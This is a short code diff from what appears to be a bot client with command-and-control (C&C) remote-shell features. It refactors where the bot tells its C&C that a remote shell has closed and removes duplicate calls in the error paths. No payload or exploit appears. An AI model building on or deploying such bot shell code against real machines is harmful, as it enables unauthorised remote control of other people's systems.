@@ -49,6 +49,9 @@ void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
     kill(shell->pid, SIGTERM);
     close(shell->fd);
 
+    /* tell cnc shell is closed */
+    laikaS_emptyOutPacket(bot->peer, LAIKAPKT_SHELL_CLOSE);
+
     bot->shell = NULL;
     laikaM_free(shell);
 
@@ -73,11 +76,6 @@ bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
         if (LN_ERRNO == LN_EWOULD || LN_ERRNO == EAGAIN)
             return true; /* recoverable, there was no data to read */
         /* not EWOULD or EAGAIN, must be an error! so close the shell */
-
-        /* tell cnc shell is closed */
-        laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
-
-        /* kill shell */
         laikaB_freeShell(bot, shell);
         return false;
     }
@@ -97,11 +95,6 @@ bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char 
             /* some error occurred */
             if (length == nLeft) {
                 /* unrecoverable error */
-
-                /* tell cnc shell is closed */
-                laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);
-
-                /* kill shell */
                 laikaB_freeShell(bot, shell);
                 return false;
             } else { /* recoverable */
